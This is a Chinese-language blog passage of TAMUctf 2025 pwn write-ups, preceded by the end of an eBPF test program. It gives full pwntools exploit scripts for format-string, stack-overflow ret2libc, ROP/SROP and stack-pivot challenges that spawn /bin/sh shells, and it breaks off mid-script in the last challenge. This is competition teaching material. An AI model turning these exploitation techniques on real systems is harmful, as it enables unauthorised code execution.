<span class="type">int</span> prog_fd = bpf_prog_load_once();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;log: \n%s\n&quot;, bpf_log_buf);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (prog_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error while loading bpf program&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">uint64_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ret = trigger1(prog_fd, payload);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error while trigger bpf program&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>;</span><br><span class="line">  value = <span class="number">0x0</span>;</span><br><span class="line">  bpf_lookup_elem(map_fd, &amp;key, &amp;value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;find map[%d] = %#lx\n&quot;</span>, key, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2$ ./test</span><br><span class="line">find map[1] = 0xaaaabbcb</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/31/2025tamuctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/03/31/2025tamuctf/" class="post-title-link" itemprop="url">[TAMUctf 2025] Pwn write-up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-03-31 23:46:35" itemprop="dateCreated datePublished" datetime="2025-03-31T23:46:35+08:00">2025-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-25 22:30:59" itemprop="dateModified" datetime="2025-04-25T22:30:59+08:00">2025-04-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>AK题目6&#x2F;8，最有意思的一集，体验很好（出题人发源码suki），最后两个题看不懂要干什么<del>摆了</del>没做</p>
</blockquote>
<h1 id="sniper"><a href="#sniper" class="headerlink" title="sniper"></a>sniper</h1><p>挺好玩的格式化字符串漏洞。很有意思的一点是读入地址为<code>0x0a0a0000</code>, 两个回车符显然是防止我们直接往栈里输入地址。<br>考查点是格式化字符串对于<code>%s</code>和<code>%$ns</code>处理先后顺序不同（前先后后），先用<code>%c</code>填充至栈地址再用<code>%hn</code>构造出<code>0x0a0a</code>构造出读入地址，再利用<code>%10$s</code>的处理顺序不同读出flag内容。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./sniper/sniper&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_sniper&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) + <span class="number">0x20</span></span><br><span class="line">ls(stack_addr)</span><br><span class="line">addr = <span class="number">0x000000000A0A0000</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">payload = <span class="string">b&quot;%c%c%c%c%c%c%c%c%c%2561c%hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%10$s&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(stack_addr + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload = b&quot;%10$ln%2570c%11$hn&quot;</span></span><br><span class="line"><span class="string">payload += b&quot;%6$p&quot;</span></span><br><span class="line"><span class="string">payload = payload.ljust(32, b&quot;a&quot;)</span></span><br><span class="line"><span class="string">payload += p64(stack_addr)</span></span><br><span class="line"><span class="string">payload += p64(stack_addr + 2)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gigem&#123;you_know_what_maybe_i_should_just_leave_naming_up_to_rng_via_http://ternus.github.io/nsaproductgenerator/&#125;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="debug1"><a href="#debug1" class="headerlink" title="debug1"></a>debug1</h1><p>程序的debug功能直接暴露了system地址，且还包含一个很长的栈溢出。<br>利用程序正常流程中的溢出将程序流导向debug函数，之后就出来了。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./debug-1/debug-1&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./debug-1/libc.so.6&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_debug-1&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span> + p64(<span class="number">0x40139F</span> + <span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;well :) )\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;libc leak: &quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000023a5f: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002235f: ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">libc_base = system - libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023A5F</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002235F</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x68</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; characters)!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="rop-thirteen"><a href="#rop-thirteen" class="headerlink" title="rop-thirteen"></a>rop-thirteen</h1><blockquote>
<p>对着源码分析即可，我都没用ida</p>
</blockquote>
<p>go pwn，然而漏洞很明显，一个貌似无限（实测是有限）的unsafe read函数：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment">// Using same memory location for feedback to save memory</span></span><br><span class="line">    sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&amp;rot13))</span><br><span class="line">    feedbackPointer := <span class="type">uintptr</span>(unsafe.Pointer(&amp;(feedback[<span class="number">0</span>])))</span><br><span class="line">    sliceHeader.Data = feedbackPointer</span><br><span class="line">    _, _ = reader.Read(rot13)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>首先随便填一些数据找到栈地址偏移(0x110)，再考虑构造ROP链。<br>题目静态链接，正好给我们提供了很多gadget<br>构造syscall ret链，先栈迁移到bss段，通过syscall read扩大溢出空间，再SROP一步到位拿shell。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./rop-thirteen/rop-thirteen&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_rop-thirteen&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;abcdefg&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;(up to 360 characters):&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000045f409: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000045e9f7: mov qword ptr [rdi], rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000465c64: xchg edi, eax; ret;</span></span><br><span class="line"><span class="string">0x000000000045dde7: xchg rdx, rax; ret;</span></span><br><span class="line"><span class="string">0x000000000045f34d: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000045f81d: mov rsp, rbp; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000041cf18: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000402481: xor rax, rax; ret;</span></span><br><span class="line"><span class="string">0x00000000004801bd: pop rdx; ret;</span></span><br><span class="line"><span class="string">0x0000000000438d50: pop rsp; ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x51C010</span></span><br><span class="line"></span><br><span class="line">syscall_ret = <span class="number">0x000000000045F409</span></span><br><span class="line">pop_rax = <span class="number">0x000000000040CC26</span></span><br><span class="line">xchg_edi_eax_ret = <span class="number">0x0000000000465C64</span></span><br><span class="line">mov_qword_rdi_rax = <span class="number">0x000000000045E9F7</span></span><br><span class="line">syscall_ret = <span class="number">0x000000000045F409</span></span><br><span class="line">pop_rdx = <span class="number">0x00000000004801BD</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000041CF18</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000045F34D</span></span><br><span class="line">leave_ret = <span class="number">0x000000000045F81D</span></span><br><span class="line">xor_rax = <span class="number">0x0000000000402481</span></span><br><span class="line">pop_rsp = <span class="number">0x0000000000438D50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 68732f6e69622f0a</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">59</span></span><br><span class="line">sigframe.rdi = addr  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;k&quot;</span> * <span class="number">0x110</span>  <span class="comment"># + b&quot;b&quot; * 0x8</span></span><br><span class="line">payload += p64(xor_rax)</span><br><span class="line">payload += p64(xchg_edi_eax_ret)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x500</span>)</span><br><span class="line">payload += p64(xor_rax)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(pop_rsp)</span><br><span class="line">payload += p64(addr + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += bytes(sigframe)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;feedback here:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">15</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># b *0x484DFB</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="debug-2"><a href="#debug-2" class="headerlink" title="debug-2"></a>debug-2</h1><p>就是debug-1把debug函数删掉了，只有一个正常流程中的0x10 bytes的栈溢出<br>0x10 bytes栈溢出有公式打法，先栈迁移到bss段再打ret2libc<br>注意这个题有个大小写转换很烦人，payload需要经过处理再发出去</p>
<blockquote>
<p>不知道为什么远程bss段比本地bss段少了两页的空间，导致在printf的时候一直爆栈，迫不得已用了一次csu跳板跳过printf环节</p>
</blockquote>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./debug-2/debug-2&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./debug-2/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_debug-2&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0b0100_0001 0x41</span></span><br><span class="line"><span class="comment"># 0b0110_0001 0x61</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0b0010_0000 0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">string</span>):</span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) &gt;= i &gt;= <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>)) <span class="keyword">or</span> (<span class="built_in">ord</span>(<span class="string">&quot;z&quot;</span>) &gt;= i &gt;= <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)):</span><br><span class="line">            tmp = i ^ <span class="number">0x20</span></span><br><span class="line">            res += tmp.to_bytes()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += i.to_bytes()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x134a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x57</span> + <span class="string">b&quot;|&quot;</span> + <span class="string">b&quot;\xd8&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text_offset = recv(<span class="string">b&quot;\n&quot;</span>) - <span class="number">0x13D8</span></span><br><span class="line">lev_ret = <span class="number">0x00000000000012DA</span> + text_offset</span><br><span class="line">pop_rdi = <span class="number">0x000000000000145B</span> + text_offset</span><br><span class="line">pop_rsi = <span class="number">0x0000000000001459</span> + text_offset</span><br><span class="line">puts_got = text_offset + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = text_offset + elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_got = text_offset + elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x4000</span> + text_offset + <span class="number">0x0E00</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span> + p64(bss + <span class="number">0x60</span>) + p64(text_offset + <span class="number">0x134A</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, change(payload))</span><br><span class="line"></span><br><span class="line">start = csu_start + text_offset</span><br><span class="line">end = start + <span class="number">0x1A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(bss + 0x80)</span></span><br><span 